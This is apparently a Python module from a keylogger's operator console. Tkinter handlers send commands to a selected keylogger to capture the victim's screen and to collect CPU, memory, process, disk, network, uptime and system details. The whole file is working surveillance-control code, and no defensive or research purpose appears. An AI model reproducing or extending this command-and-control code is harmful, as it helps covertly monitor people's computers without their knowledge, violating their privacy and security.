import logging

from .base import BaseEventHandler
from settings import app_config
from server import Server
from gui import UIManager
import commands
from utils import EventHandlerRegister, AsyncTkinter, ImageManagerX

logger = logging.getLogger(__name__)


class BaseHandlers:
    @staticmethod
    def change_command_state(func):
        async def wrapper(*args, **kwargs):
            BaseEventHandler.change_state_client_buttons(state='disabled')
            res = await func(*args, **kwargs)
            BaseEventHandler.change_state_client_buttons(state='enabled')
            return res
        return wrapper

    @staticmethod
    def change_text(func):
        async def wrapper(*args, **kwargs):
            text = UIManager.REGISTER.get(app_config.gui.keys.widget_names.INFO_TEXT)
            text.configure(state='normal')
            text.delete('1.0', 'end')
            res = await func(*args, **kwargs)
            if res:
                text.insert('end', res)
            text.configure(state='disable')
        return wrapper


class CommandHandlers(BaseHandlers):
    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_CREATE_SCREEN)
    @AsyncTkinter.async_handler
    @BaseHandlers.change_command_state
    async def command_screenshot():
        UIManager.REGISTER.get(app_config.gui.keys.widget_names.BUTTON_SAVE_SCREEN).configure(state='disabled')
        server = Server()
        logger.info(f'Screenshot command send -> {server.selected_keylogger}')
        response = await server.request(commands.ScreenshotCommand)
        if response is None:
            BaseEventHandler.change_state_header_buttons('enabled')
            return
        frame = UIManager.REGISTER.get(app_config.gui.keys.widget_names.SCREEN_FRAME_IMG)
        img = ImageManagerX(response, (frame.winfo_width() - 20, frame.winfo_height()))
        label = UIManager.REGISTER.get(app_config.gui.keys.widget_names.LABEL_SCREEN)
        label.configure(image=img.tk_image)
        label.image = img
        UIManager.REGISTER.get(app_config.gui.keys.widget_names.BUTTON_SAVE_SCREEN).configure(state='enabled')

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_INFO_CPU)
    @AsyncTkinter.async_handler
    @BaseHandlers.change_text
    @BaseHandlers.change_command_state
    async def info_cpu():
        command = commands.InfoCPU
        server = Server()
        logger.info(f'Info command {command.COMMAND} send -> {server.selected_keylogger}')
        response = await server.request(command)
        response = response.decode() if response else None
        return response

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_INFO_MEMORY)
    @AsyncTkinter.async_handler
    @BaseHandlers.change_text
    @BaseHandlers.change_command_state
    async def info_memory():
        command = commands.InfoMemory
        server = Server()
        logger.info(f'Info command {command.COMMAND} send -> {server.selected_keylogger}')
        response = await server.request(command)
        response = response.decode() if response else None
        return response

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_INFO_PROCESS)
    @AsyncTkinter.async_handler
    @BaseHandlers.change_text
    @BaseHandlers.change_command_state
    async def info_process():
        command = commands.InfoProcess
        server = Server()
        logger.info(f'Info command {command.COMMAND} send -> {server.selected_keylogger}')
        response = await server.request(command)
        response = response.decode() if response else None
        return response

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_INFO_DISK)
    @AsyncTkinter.async_handler
    @BaseHandlers.change_text
    @BaseHandlers.change_command_state
    async def info_disk():
        command = commands.InfoDisk
        server = Server()
        logger.info(f'Info command {command.COMMAND} send -> {server.selected_keylogger}')
        response = await server.request(command)
        response = response.decode() if response else None
        return response

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_INFO_NETWORK)
    @AsyncTkinter.async_handler
    @BaseHandlers.change_text
    @BaseHandlers.change_command_state
    async def info_network():
        command = commands.InfoNetwork
        server = Server()
        logger.info(f'Info command {command.COMMAND} send -> {server.selected_keylogger}')
        response = await server.request(command)
        response = response.decode() if response else None
        return response

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_INFO_UPTIME)
    @AsyncTkinter.async_handler
    @BaseHandlers.change_text
    @BaseHandlers.change_command_state
    async def info_uptime():
        command = commands.InfoUptime
        server = Server()
        logger.info(f'Info command {command.COMMAND} send -> {server.selected_keylogger}')
        response = await server.request(command)
        response = response.decode() if response else None
        return response

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_INFO_SYSINFO)
    @AsyncTkinter.async_handler
    @BaseHandlers.change_text
    @BaseHandlers.change_command_state
    async def info_sysinfo():
        command = commands.InfoSys
        server = Server()
        logger.info(f'Info command {command.COMMAND} send -> {server.selected_keylogger}')
        response = await server.request(command)
        response = response.decode() if response else None
        return response
